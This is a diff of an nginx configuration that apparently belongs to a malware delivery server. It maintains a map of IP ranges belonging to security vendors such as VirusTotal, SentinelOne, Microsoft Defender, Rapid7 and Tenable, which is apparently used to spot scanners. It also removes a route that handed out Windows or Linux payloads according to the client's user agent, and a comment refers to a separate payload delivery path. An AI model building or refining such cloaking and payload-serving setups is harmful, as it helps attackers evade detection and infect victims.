@@ -22,7 +22,7 @@ map $remote_addr $is_known_security_ip {
     "74.125.0.0/16" 1;      # Google Cloud (VirusTotal)
     "216.239.32.0/19" 1;    # Google
     
-    # Recorded Future
+    # Recorded Future & SentinelOne (merged - both use Google Cloud)
     "104.196.0.0/14" 1;     # Google Cloud
     "35.184.0.0/13" 1;      # Google Cloud
     
@@ -53,7 +53,7 @@ map $remote_addr $is_known_security_ip {
     
     # SentinelOne
     "104.36.227.0/24" 1;
-    "104.196.0.0/14" 1;
+    # "104.196.0.0/14" 1;  # Removed duplicate - already defined for Recorded Future
     
     # Microsoft Defender
     "13.64.0.0/11" 1;      # Azure (Microsoft Defender)
@@ -76,8 +76,8 @@ map $remote_addr $is_known_security_ip {
     # Rapid7
     "5.63.0.0/16" 1;
     "38.107.201.0/24" 1;
-    "45.60.0.0/16" 1;
-    "71.6.0.0/16" 1;
+    # "45.60.0.0/16" 1;    # Removed duplicate - already defined for CrowdStrike
+    "71.6.0.0/16" 1;       # Note: This may overlap with Shodan ranges
     "206.225.0.0/16" 1;
     
     # Tenable/Nessus
@@ -196,18 +196,6 @@ server {
         proxy_set_header Host $host;
         proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
         proxy_set_header X-Real-IP $remote_addr;
-    }
-
-    # Redirect specific payload formats based on client OS
-    location ~ ^/download/payload$ {
-        if ($http_user_agent ~* windows) {
-            return 302 /content/windows/$win_exe;
-        }
-        if ($http_user_agent ~* linux) {
-            return 302 /content/linux/$linux_bin;
-        }
-        # Default fallback for unknown OS
-        return 302 /;
     }
 
     # Secure payload delivery path for synced payloads
